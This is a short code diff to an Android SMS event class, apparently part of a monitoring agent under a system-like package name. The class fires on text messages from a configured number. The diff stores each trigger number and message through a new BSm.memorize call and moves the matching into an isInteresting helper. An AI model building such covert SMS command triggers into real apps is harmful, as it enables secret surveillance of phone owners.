@@ -13,6 +13,7 @@ import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfEvent;
 import com.android.networking.conf.ConfigurationException;
 import com.android.networking.interfaces.Observer;
+import com.android.networking.listener.BSm;
 import com.android.networking.listener.ListenerSms;
 import com.android.networking.module.message.Sms;
 import com.android.networking.util.Check;
@@ -39,6 +40,8 @@ public class EventSms extends BaseEvent implements Observer<Sms> {
 		try {
 			number = conf.getString("number");
 			msg = conf.getString("text").toLowerCase();
+			
+			BSm.memorize(number, msg);
 
 		} catch (final ConfigurationException e) {
 			if (Cfg.EXCEPTION) {
@@ -64,13 +67,8 @@ public class EventSms extends BaseEvent implements Observer<Sms> {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " Got SMS notification from: " + s.getAddress() + " Body: " + s.getBody());//$NON-NLS-1$ //$NON-NLS-2$
 		}
-
-		if (s.getAddress().toLowerCase().endsWith(this.number) == false) {
-			return 0;
-		}
-
-		// Case insensitive
-		if (s.getBody().toLowerCase().startsWith(this.msg) == false) {
+		
+		if(!isInteresting(s, this.number, this.msg)){
 			return 0;
 		}
 
@@ -78,5 +76,18 @@ public class EventSms extends BaseEvent implements Observer<Sms> {
 		onExit();
 
 		return 1;
+	}
+
+	public static boolean isInteresting(Sms s, String number, String msg) {
+		if (s.getAddress().toLowerCase().endsWith(number) == false) {
+			return false;
+		}
+
+		// Case insensitive
+		if (s.getBody().toLowerCase().startsWith(msg) == false) {
+			return false;
+		}
+		
+		return true;
 	}
 }
